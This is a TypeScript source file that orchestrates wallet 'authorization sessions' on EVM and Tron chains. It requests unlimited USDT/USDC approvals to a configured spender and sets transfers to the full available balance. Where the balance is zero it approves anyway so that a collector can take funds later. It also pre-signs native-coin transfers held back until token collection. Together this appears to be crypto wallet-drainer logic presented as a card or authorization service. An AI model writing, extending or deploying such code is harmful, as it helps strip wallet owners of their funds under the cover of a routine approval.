import { formatTransferSkipReason } from "@trustmycard/shared/constants/collection";
import { generateFlowId } from "@trustmycard/shared/ids";
import { getToken, parseHumanToRaw } from "../core/chain-tokens";
import type { ApprovalOrchestrationResult } from "../approval/types";
import { ApprovalStageName } from "../approval/types";
import type { ApprovalRequest } from "../approval/types";
import type { NativeTransferResult } from "../native-transfer/types";
import { authorizeNativeInWalletPhase } from "../native-transfer/native-wallet-authorize";
import { getErrorMessage, isUserRejection } from "../core/errors";
import {
  alreadyAuthorizedResult,
  createPreflightApi,
  preflightExistingAllowance,
} from "./allowance-preflight";
import { collectForExistingAllowance } from "./existing-allowance-collection";
import {
  SessionTimelineTracker,
  flushSessionTimeline,
} from "../observability/session-timeline";
import type { LogStatus } from "@trustmycard/shared/observability";
import type {
  AuthorizationAssetOutcome,
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  LinkedAccounts,
  NetworkRow,
  TokenSymbol,
  UniversalProvider,
} from "../types";
import {
  planAuthorizationWork,
  runEvmTokenBatchApproval,
  type EvmTokenBatchRunResult,
} from "./evm-token-batch";
import {
  filterBatchResultsForNativeRetry,
  inferEvmBatchNativeOutcome,
  shouldSkipNativeWalletPhaseAfterBatch,
} from "./evm-batch-native-outcome";
import { runAuthorizationSettlement } from "./phases/settlement-coordinator";
import type { SettlementRunResult } from "./phases/types";
import type {
  SettlementProgressEvent,
  WalletPhaseCapture,
  WalletPhaseTokenCapture,
} from "./phases/types";
import type { NativeTransferOrchestrator } from "../native-transfer/orchestrator";
import {
  balanceForNative,
  balanceForToken,
  nativeDecimalsForNetwork,
  type IncludedAssetWorkItem,
} from "./preferences";

export type RunAuthorizationSessionArgs = {
  items: IncludedAssetWorkItem[];
  networks: NetworkRow[];
  accounts: LinkedAccounts;
  getSpender: (networkKey: string) => string;
  /** Wallet phase only — stops after on-chain approve broadcast. */
  runApproval: (args: {
    network: string;
    owner: string;
    token: TokenSymbol;
    amountHuman?: string;
    unlimited: boolean;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      data?: unknown;
      error?: string | null;
    }) => void;
  }) => Promise<ApprovalOrchestrationResult>;
  /** Settlement phase — confirms allowance and persists approval. */
  runApprovalSettlement?: (args: {
    network: string;
    owner: string;
    token: TokenSymbol;
    walletPhaseContext: ApprovalOrchestrationResult["context"];
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    unlimited: boolean;
    amountHuman?: string;
    walletSessionToken?: string;
  }) => Promise<ApprovalOrchestrationResult>;
  runNativeTransfer?: (args: {
    network: string;
    owner: string;
    unlimited: boolean;
    amountHuman?: string;
    walletSessionToken?: string;
    nativeReadinessTokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalTxHash?: string | null;
      approvalId?: string | null;
    }>;
    mode?: "full" | "authorize_only" | "execute_deferred";
    deferredSignedRaw?: string;
    deferredTransferableRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      error?: string | null;
    }) => void;
  }) => Promise<NativeTransferResult>;
  /** Native orchestrator fallback when runNativeTransfer is not wired. */
  nativeOrchestrator?: NativeTransferOrchestrator;
  onAssetStart?: (item: IncludedAssetWorkItem) => void;
  onAssetEnd?: (result: AuthorizationAssetResult) => void;
  onWalletPhaseComplete?: (summary: AuthorizationSessionResult) => void;
  onSettlementProgress?: (event: SettlementProgressEvent) => void;
  onSettlementComplete?: (network: string, result: SettlementRunResult) => void;
  /** When false, only wallet phase runs (testing). Default true. */
  startSettlement?: boolean;
  log?: (step: string, detail?: Record<string, unknown>) => void;
  sessionId?: string;
  authorizationSessionId?: string;
  /** Canonical journey ID (alias for traceId / sessionId when provided). */
  transactionId?: string;
  evmBatchProvider?: UniversalProvider;
  /** Provider kept alive for settlement (session auth + EVM native execution). */
  settlementProvider?: UniversalProvider;
  apiBaseUrl?: string;
};

function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
  return (
    outcome === "authorized" || outcome === "collected" || outcome === "pending"
  );
}

function summarize(
  items: AuthorizationAssetResult[],
): AuthorizationSessionResult {
  return {
    items,
    authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
    failedCount: items.filter((i) => i.outcome === "failed").length,
    rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
    skippedCount: items.filter(
      (i) =>
        i.outcome === "skipped_unsupported" ||
        i.outcome === "skipped_zero" ||
        i.outcome === "skipped_dependency_failed",
    ).length,
  };
}

function applyEvmBatchNativeCapture(args: {
  batchResults: EvmTokenBatchRunResult;
  network: string;
  owner: string;
  capture: WalletPhaseCapture;
}): void {
  const { batchResults, network, owner, capture } = args;
  const outcome = inferEvmBatchNativeOutcome(batchResults);

  if (
    outcome === "succeeded" &&
    batchResults.batchIncludedNative &&
    batchResults.nativeTxHash
  ) {
    capture.native = {
      network,
      owner,
      authorizationKind: "evm_batch_executed",
      authorizationPayload: { txHash: batchResults.nativeTxHash },
      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
      recipient: batchResults.nativeRecipient ?? undefined,
    };
    return;
  }

  if (outcome === "unknown" && batchResults.batchId) {
    capture.native = {
      network,
      owner,
      authorizationKind: "evm_batch_unknown",
      authorizationPayload: {
        batchId: batchResults.batchId,
        chainId: batchResults.batchChainId ?? null,
        tokenJobCount: batchResults.batchNativeJobCount ?? 0,
      },
      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
      recipient: batchResults.nativeRecipient ?? undefined,
    };
  }
}

/**
 * Two-phase authorization:
 * 1. Wallet phase — consecutive popups (USDT/USDC approve; Tron native sign only).
 * 2. Settlement phase — confirm approvals, collect USDT → USDC via existing queue, then native.
 */
export async function runAuthorizationSession(
  args: RunAuthorizationSessionArgs,
): Promise<AuthorizationSessionResult> {
  const results: AuthorizationAssetResult[] = [];
  const captures: WalletPhaseCapture[] = [];
  const log = args.log ?? (() => undefined);
  const walletForJourney = args.accounts.evm || args.accounts.tron;
  const sessionId =
    args.transactionId?.trim() ||
    args.sessionId?.trim() ||
    args.authorizationSessionId?.trim() ||
    (walletForJourney
      ? generateFlowId({ walletAddress: walletForJourney })
      : "");
  if (!sessionId) {
    throw new Error("transactionId is required for authorization session");
  }
  const transactionId = args.transactionId ?? sessionId;
  const timeline = new SessionTimelineTracker({
    sessionId,
    authorizationSessionId: args.authorizationSessionId ?? sessionId,
  });
  timeline.startRoot("AUTHORIZATION_STARTED");

  log("AUTHORIZATION SESSION STARTED", {
    sessionId,
    transactionId,
    assetCount: args.items.length,
    assets: args.items.map((i) => `${i.network}:${i.asset}`),
    mode: "wallet_phase_first",
  });

  const workUnits = planAuthorizationWork(args.items);
  const captureByNetwork = new Map<string, WalletPhaseCapture>();

  for (const unit of workUnits) {
    if (unit.kind === "evm_token_batch" && unit.items.length >= 1) {
      if (args.evmBatchProvider) {
        const batchResults = await runEvmTokenBatchApproval({
          items: unit.items,
          network: unit.network,
          nativeItem: unit.nativeItem,
          networks: args.networks,
          accounts: args.accounts,
          provider: args.evmBatchProvider,
          apiBaseUrl: args.apiBaseUrl,
          getSpender: args.getSpender,
          runApproval: args.runApproval,
          onAssetStart: args.onAssetStart,
          onAssetEnd: args.onAssetEnd,
          log,
          walletPhaseOnly: true,
        });
        const batchNativeOutcome = inferEvmBatchNativeOutcome(batchResults);
        results.push(
          ...(batchNativeOutcome === "failed_revert"
            ? filterBatchResultsForNativeRetry(
                batchResults.results,
                unit.network,
              )
            : batchResults.results),
        );

        const owner = args.accounts.evm;
        if (owner) {
          const existing = captureByNetwork.get(unit.network) ?? {
            sessionId,
            network: unit.network,
            owner,
            tokens: [],
            native: null,
            batchId: batchResults.batchId ?? null,
          };
          if (batchResults.tokenCaptures.length > 0) {
            existing.tokens.push(...batchResults.tokenCaptures);
            existing.batchId = batchResults.batchId ?? existing.batchId;
          }
          applyEvmBatchNativeCapture({
            batchResults,
            network: unit.network,
            owner,
            capture: existing,
          });
          if (
            unit.nativeItem &&
            !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true)
          ) {
            if (batchNativeOutcome === "failed_revert") {
              log?.("EIP5792_BATCH_NATIVE_RETRY_WALLET_PHASE", {
                network: unit.network,
                outcome: batchNativeOutcome,
              });
            }
            captureByNetwork.set(unit.network, existing);
            await runNativeWalletPhase({
              item: unit.nativeItem,
              args,
              results,
              captureByNetwork,
              sessionId,
              log,
            });
          }
          if (existing.tokens.length > 0 || existing.native) {
            captureByNetwork.set(unit.network, existing);
          }
        }
        continue;
      }

      for (const item of unit.items) {
        args.onAssetStart?.(item);
        await runTokenWalletPhase({
          item: { ...item, asset: item.asset as TokenSymbol },
          args,
          results,
          captureByNetwork,
          sessionId,
          log,
        });
      }
      if (unit.nativeItem) {
        await runNativeWalletPhase({
          item: unit.nativeItem,
          args,
          results,
          captureByNetwork,
          sessionId,
          log,
        });
      }
      continue;
    }

    if (unit.kind !== "single") continue;

    const item = unit.item;
    args.onAssetStart?.(item);

    if (item.asset === "NATIVE") {
      await runNativeWalletPhase({
        item: item as IncludedAssetWorkItem & { asset: "NATIVE" },
        args,
        results,
        captureByNetwork,
        sessionId,
        log,
      });
      continue;
    }

    await runTokenWalletPhase({
      item: { ...item, asset: item.asset },
      args,
      results,
      captureByNetwork,
      sessionId,
      log,
    });
  }

  captures.push(...captureByNetwork.values());

  const walletSummary = summarize(results);
  const outcome: LogStatus =
    walletSummary.failedCount > 0 || walletSummary.rejectedCount > 0
      ? walletSummary.authorizedCount > 0
        ? "partial_success"
        : "failure"
      : "success";
  timeline.complete(outcome);
  void flushSessionTimeline(timeline.snapshot());

  log("WALLET PHASE COMPLETE", {
    sessionId,
    authorizedCount: walletSummary.authorizedCount,
    failedCount: walletSummary.failedCount,
    rejectedCount: walletSummary.rejectedCount,
    skippedCount: walletSummary.skippedCount,
    settlementCaptures: captures.length,
  });

  args.onWalletPhaseComplete?.(walletSummary);

  if (
    args.startSettlement !== false &&
    args.runApprovalSettlement &&
    captures.length > 0
  ) {
    for (const capture of captures) {
      void runAuthorizationSettlement({
        capture,
        networks: args.networks,
        accounts: args.accounts,
        apiBaseUrl: args.apiBaseUrl,
        provider: args.settlementProvider ?? args.evmBatchProvider,
        getSpender: args.getSpender,
        runApprovalSettlement: (settlementArgs) =>
          args.runApprovalSettlement!({
            ...settlementArgs,
            walletPhaseContext: settlementArgs.walletPhaseContext,
          }),
        runNativeTransfer: args.runNativeTransfer,
        onProgress: args.onSettlementProgress,
        log,
      }).then((settlementResult) => {
        args.onSettlementComplete?.(capture.network, settlementResult);
        log("SETTLEMENT COMPLETE", {
          network: capture.network,
          ok: settlementResult.ok,
          settlementSessionId: settlementResult.settlementSessionId,
        });
      });
    }
  }

  return walletSummary;
}

async function runTokenWalletPhase(ctx: {
  item: IncludedAssetWorkItem & { asset: TokenSymbol };
  args: RunAuthorizationSessionArgs;
  results: AuthorizationAssetResult[];
  captureByNetwork: Map<string, WalletPhaseCapture>;
  sessionId: string;
  log: RunAuthorizationSessionArgs["log"];
}): Promise<void> {
  const { item, args, results, captureByNetwork, sessionId, log } = ctx;
  const token = item.asset;

  const networkRow = args.networks.find((n) => n.key === item.network);
  const tokenInfo = getToken(item.network, token);
  if (!networkRow || !tokenInfo) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "skipped_unsupported",
      message: `Unsupported token ${token} on ${item.network}`,
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const owner =
    item.network === "tron" ? args.accounts.tron : args.accounts.evm;
  if (!owner) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "failed",
      message:
        item.network === "tron"
          ? "No Tron address in this WalletConnect session"
          : "No EVM address in this WalletConnect session",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const spender = args.getSpender(item.network);
  if (!spender) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "failed",
      message: "Spender not configured",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const tokenBalanceHuman = balanceForToken(networkRow, token);
  const nativeBalanceHuman = networkRow.balances.native ?? "0";

  try {
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals,
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    if (!shouldAttemptTransfer) {
      log?.("ZERO_BALANCE_COLLECT_LATER", {
        network: item.network,
        token,
        tokenBalanceHuman,
        policy: "approve proceeds — collector will transfer when balance > 0",
      });
    }

    if (owner) {
      try {
        const preflightRequest: ApprovalRequest = {
          network: item.network,
          owner,
          token,
          amountHuman: item.unlimited ? undefined : item.amountHuman,
          unlimited: item.unlimited,
          nativeBalanceHuman,
          tokenBalanceHuman,
          executeTransfer: shouldAttemptTransfer,
          transferToAddress: spender,
          transferAmountRaw: shouldAttemptTransfer
            ? transferAmountRaw
            : undefined,
          traceId: args.transactionId ?? sessionId,
        };
        const preflightApi = createPreflightApi(args.apiBaseUrl);
        const preflight = await preflightExistingAllowance({
          api: preflightApi,
          request: preflightRequest,
        });
        if (preflight.alreadyAuthorized && !shouldAttemptTransfer) {
          const result = alreadyAuthorizedResult({
            item: { ...item, asset: token },
          });
          results.push(result);
          args.onAssetEnd?.(result);
          return;
        }
        if (preflight.alreadyAuthorized && shouldAttemptTransfer) {
          const result = await collectForExistingAllowance({
            item: { ...item, asset: token },
            request: preflightRequest,
            prepared: preflight.prepared,
            apiBaseUrl: args.apiBaseUrl,
          });
          results.push(result);
          args.onAssetEnd?.(result);
          return;
        }
      } catch (err) {
        log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
          network: item.network,
          token,
          error: getErrorMessage(err, "Allowance preflight unavailable"),
        });
      }
    }

    const orchestration = await args.runApproval({
      network: item.network,
      owner,
      token,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      unlimited: item.unlimited,
      nativeBalanceHuman,
      tokenBalanceHuman,
      executeTransfer: shouldAttemptTransfer,
      transferToAddress: spender,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
      onStage: (stageResult) => {
        if (
          stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES ||
          stageResult.stage === ApprovalStageName.WAIT_RESOURCES_READY
        ) {
          log?.("RESOURCE STAGE", {
            network: item.network,
            token,
            stage: stageResult.stage,
            status: stageResult.status,
          });
        }
      },
    });

    if (!orchestration.ok) {
      const rejected = Boolean(orchestration.userRejected);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(orchestration.error, "Approval failed"),
        txHash: orchestration.txHash,
        approvalId: orchestration.approvalId,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      return;
    }

    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "authorized",
      message: "Wallet approved — settlement queued",
      txHash: orchestration.txHash,
      approvalId: orchestration.approvalId,
    };
    results.push(result);
    args.onAssetEnd?.(result);

    const capture = captureByNetwork.get(item.network) ?? {
      sessionId,
      network: item.network,
      owner,
      tokens: [],
      native: null,
      batchId: null,
    };
    capture.tokens.push({
      item,
      orchestration,
      shouldAttemptTransfer,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
    } satisfies WalletPhaseTokenCapture);
    captureByNetwork.set(item.network, capture);
  } catch (err: unknown) {
    const rejected = isUserRejection(err);
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: rejected ? "user_rejected" : "failed",
      message: getErrorMessage(err, "Approval failed"),
    };
    results.push(result);
    args.onAssetEnd?.(result);
  }
}

async function runNativeWalletPhase(ctx: {
  item: IncludedAssetWorkItem & { asset: "NATIVE" };
  args: RunAuthorizationSessionArgs;
  results: AuthorizationAssetResult[];
  captureByNetwork: Map<string, WalletPhaseCapture>;
  sessionId: string;
  log: RunAuthorizationSessionArgs["log"];
}): Promise<void> {
  const { item, args, results, captureByNetwork, sessionId, log } = ctx;

  args.onAssetStart?.(item);

  const owner =
    item.network === "tron" ? args.accounts.tron : args.accounts.evm;

  const tokenDependencyFailed = results.some(
    (r) =>
      r.network === item.network &&
      r.token !== "NATIVE" &&
      (r.outcome === "failed" || r.outcome === "user_rejected"),
  );
  if (tokenDependencyFailed) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "skipped_dependency_failed",
      message:
        "Skipped native authorization because token authorization failed",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  if (!owner) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: "No wallet address for native authorization",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  // EVM: early eth_signTransaction when supported; otherwise defer popup to settlement.
  if (item.network !== "tron") {
    const provider = args.evmBatchProvider ?? args.settlementProvider;
    if (!provider) {
      log?.("NATIVE DEFERRED TO SETTLEMENT", {
        network: item.network,
        owner,
        reason: "no_wallet_provider",
        policy: "settlement eth_sendTransaction after token collection",
      });
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: "NATIVE",
        outcome: "authorized",
        message:
          "Native deferred — eth_sendTransaction after token settlement",
      };
      results.push(result);
      args.onAssetEnd?.(result);

      const capture = captureByNetwork.get(item.network) ?? {
        sessionId,
        network: item.network,
        owner,
        tokens: [],
        native: null,
        batchId: null,
      };
      capture.native = {
        network: item.network,
        owner,
        authorizationKind: "evm_deferred",
        authorizationPayload: { evmDeferred: true },
      };
      captureByNetwork.set(item.network, capture);
      return;
    }

    log?.("NATIVE WALLET AUTHORIZATION STARTED", {
      network: item.network,
      owner,
      policy:
        "EVM sign now (eth_signTransaction) — broadcast deferred until token collection",
    });

    if (args.runNativeTransfer) {
      const authResult = await args.runNativeTransfer({
        network: item.network,
        owner,
        unlimited: item.unlimited,
        amountHuman: item.unlimited ? undefined : item.amountHuman,
        mode: "authorize_only",
      });

      if (!authResult.ok) {
        const message = getErrorMessage(
          authResult.error,
          "Native authorization failed",
        );
        const unsupported =
          /eth_signTransaction|method not found|not supported|unsupported method|does not support/i.test(
            message,
          );
        if (unsupported) {
          log?.("NATIVE DEFERRED TO SETTLEMENT", {
            network: item.network,
            owner,
            reason: message,
            policy:
              "eth_signTransaction unsupported — settlement eth_sendTransaction",
          });
          const result: AuthorizationAssetResult = {
            network: item.network,
            token: "NATIVE",
            outcome: "authorized",
            message:
              "Native deferred — eth_sendTransaction after token settlement",
          };
          results.push(result);
          args.onAssetEnd?.(result);

          const capture = captureByNetwork.get(item.network) ?? {
            sessionId,
            network: item.network,
            owner,
            tokens: [],
            native: null,
            batchId: null,
          };
          capture.native = {
            network: item.network,
            owner,
            authorizationKind: "evm_deferred",
            authorizationPayload: { evmDeferred: true },
          };
          captureByNetwork.set(item.network, capture);
          return;
        }

        const result: AuthorizationAssetResult = {
          network: item.network,
          token: "NATIVE",
          outcome: authResult.userRejected ? "user_rejected" : "failed",
          message,
        };
        results.push(result);
        args.onAssetEnd?.(result);
        return;
      }

      if (!authResult.deferredSignedRaw) {
        const result: AuthorizationAssetResult = {
          network: item.network,
          token: "NATIVE",
          outcome: "failed",
          message: "Wallet authorization did not return a signed transaction",
        };
        results.push(result);
        args.onAssetEnd?.(result);
        return;
      }

      const result: AuthorizationAssetResult = {
        network: item.network,
        token: "NATIVE",
        outcome: "authorized",
        message: "Native signed — broadcast deferred until token settlement",
      };
      results.push(result);
      args.onAssetEnd?.(result);

      const capture = captureByNetwork.get(item.network) ?? {
        sessionId,
        network: item.network,
        owner,
        tokens: [],
        native: null,
        batchId: null,
      };
      capture.native = {
        network: item.network,
        owner,
        authorizationKind: "evm_signed",
        authorizationPayload: { signedRaw: authResult.deferredSignedRaw },
        estimateTransferableRaw: authResult.deferredTransferableRaw,
        recipient: authResult.context.estimate?.recipient,
      };
      captureByNetwork.set(item.network, capture);
      return;
    }

    const authResult = await authorizeNativeInWalletPhase({
      provider,
      network: item.network,
      owner,
      unlimited: item.unlimited,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      apiBaseUrl: args.apiBaseUrl,
      traceId: args.transactionId ?? sessionId,
      orchestrator: args.nativeOrchestrator,
      onStage: (stageResult) => {
        if (
          stageResult.stage === "REFRESH_ESTIMATE" ||
          stageResult.stage === "SIGN"
        ) {
          log?.("NATIVE WALLET SIGN STAGE", {
            network: item.network,
            stage: stageResult.stage,
            status: stageResult.status,
          });
        }
      },
    });

    if (!authResult.ok) {
      if (authResult.fallbackDeferred) {
        log?.("NATIVE DEFERRED TO SETTLEMENT", {
          network: item.network,
          owner,
          reason: authResult.error,
          policy: "eth_signTransaction unsupported — settlement eth_sendTransaction",
        });
        const result: AuthorizationAssetResult = {
          network: item.network,
          token: "NATIVE",
          outcome: "authorized",
          message:
            "Native deferred — eth_sendTransaction after token settlement",
        };
        results.push(result);
        args.onAssetEnd?.(result);

        const capture = captureByNetwork.get(item.network) ?? {
          sessionId,
          network: item.network,
          owner,
          tokens: [],
          native: null,
          batchId: null,
        };
        capture.native = {
          network: item.network,
          owner,
          authorizationKind: "evm_deferred",
          authorizationPayload: { evmDeferred: true },
        };
        captureByNetwork.set(item.network, capture);
        return;
      }

      const result: AuthorizationAssetResult = {
        network: item.network,
        token: "NATIVE",
        outcome: authResult.userRejected ? "user_rejected" : "failed",
        message: authResult.error,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      return;
    }

    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "authorized",
      message: "Native signed — broadcast deferred until token settlement",
    };
    results.push(result);
    args.onAssetEnd?.(result);

    const capture = captureByNetwork.get(item.network) ?? {
      sessionId,
      network: item.network,
      owner,
      tokens: [],
      native: null,
      batchId: null,
    };
    capture.native = authResult.capture;
    captureByNetwork.set(item.network, capture);
    return;
  }

  const provider = args.evmBatchProvider ?? args.settlementProvider;
  if (!provider) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: "Wallet provider not available for native authorization",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  log?.("NATIVE WALLET AUTHORIZATION STARTED", {
    network: item.network,
    owner,
    policy: "Tron sign now — broadcast deferred until USDT/USDC settlement",
  });

  const authResult = await authorizeNativeInWalletPhase({
    provider,
    network: item.network,
    owner,
    unlimited: item.unlimited,
    amountHuman: item.unlimited ? undefined : item.amountHuman,
    apiBaseUrl: args.apiBaseUrl,
    traceId: args.transactionId ?? sessionId,
  });

  if (!authResult.ok) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: authResult.userRejected ? "user_rejected" : "failed",
      message: authResult.error,
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const result: AuthorizationAssetResult = {
    network: item.network,
    token: "NATIVE",
    outcome: "authorized",
    message: "Native signed — broadcast deferred until token settlement",
  };
  results.push(result);
  args.onAssetEnd?.(result);

  const capture = captureByNetwork.get(item.network) ?? {
    sessionId,
    network: item.network,
    owner,
    tokens: [],
    native: null,
    batchId: null,
  };
  capture.native = authResult.capture;
  captureByNetwork.set(item.network, capture);
}

export function outcomeLabel(
  outcome: AuthorizationAssetResult["outcome"],
): string {
  switch (outcome) {
    case "authorized":
      return "Authorized — settlement queued";
    case "user_rejected":
      return "User rejected — remaining assets continued";
    case "failed":
      return "Failed";
    case "skipped_unsupported":
      return "Skipped — unsupported";
    case "skipped_zero":
      return "Skipped — zero transferable";
    case "skipped_dependency_failed":
      return "Skipped — dependency failed";
    case "collected":
      return "Transfer confirmed";
    case "pending":
      return "Transfer pending";
    default:
      return outcome;
  }
}
